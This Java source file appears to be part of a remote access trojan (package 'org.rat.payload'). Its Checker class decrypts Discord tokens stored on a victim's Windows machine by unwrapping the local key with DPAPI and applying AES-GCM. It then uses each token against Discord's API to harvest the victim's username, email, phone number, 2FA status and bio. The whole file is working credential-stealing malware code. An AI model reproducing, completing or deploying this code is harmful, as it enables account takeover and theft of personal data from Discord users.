//Raddon On Top!

package org.rat.payload.payloads.discord;

import org.json.*;
import java.util.*;
import com.sun.jna.platform.win32.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import java.security.*;
import java.security.spec.*;

public class Checker
{
    public static String osKey;
    
    public String checkUser(final String token) {
        final JSONObject response = new JSONObject(Helper.getRequest().get("https://discordapp.com/api/v9/users/@me", token));
        String info = "===User Info===\n\n\n";
        final String username = String.format("%s#%s", response.getString("username"), response.getString("discriminator"));
        final String bio = response.getString("bio");
        final String email = response.getString("email");
        final Boolean twofa = response.getBoolean("mfa_enabled");
        final Boolean verified = response.getBoolean("verified");
        info = info + "Username: " + username;
        info = info + "\nBio: " + bio;
        info = info + "\nEmail: " + email;
        try {
            info = info + "\nPhone: " + response.getString("phone");
        }
        catch (Exception ex) {}
        return String.format(info + "\n2FA: %b\nVerified: %b\n\nToken: %s", twofa, verified, token);
    }
    
    public static String decryptToken(final String token) throws Exception {
        final byte[] z = Base64.getDecoder().decode(Checker.osKey);
        final byte[] y = Arrays.copyOfRange(z, 5, z.length);
        final byte[] finalKey = Crypt32Util.cryptUnprotectData(y);
        final byte[] finaltoken = new byte[12];
        final byte[] tok = Base64.getDecoder().decode(token.split("dQw4w9WgXcQ:")[1]);
        for (int i = 0; i < 12; ++i) {
            finaltoken[i] = tok[i + 3];
        }
        final byte[] data = new byte[tok.length - 15];
        for (int j = 0; j < data.length; ++j) {
            data[j] = tok[j + 15];
        }
        final Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(2, new SecretKeySpec(finalKey, "AES"), new GCMParameterSpec(128, finaltoken));
        return new String(cipher.doFinal(data));
    }
    
    static {
        Checker.osKey = null;
    }
}
